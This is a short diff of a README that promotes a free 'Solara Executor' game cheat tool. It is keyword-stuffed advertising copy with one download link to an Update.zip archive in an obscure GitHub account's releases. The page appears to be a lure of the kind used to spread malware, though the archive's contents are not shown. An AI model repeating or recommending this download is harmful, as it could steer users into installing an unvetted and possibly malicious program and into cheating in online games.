@@ -1,4 +1,4 @@
-Click For Download</a>
+
 # Solara Executor - Solara Executor Free - Solara Executor 2024
 Download Solara Executor for free in 2024. Enjoy seamless gaming experience with the latest version of Solara Executor, featuring enhanced performance and features.
 # *[📁 Download ](https://github.com/Tweexmgqhs/solara-executor/releases/download/Update/Update.zip)* 
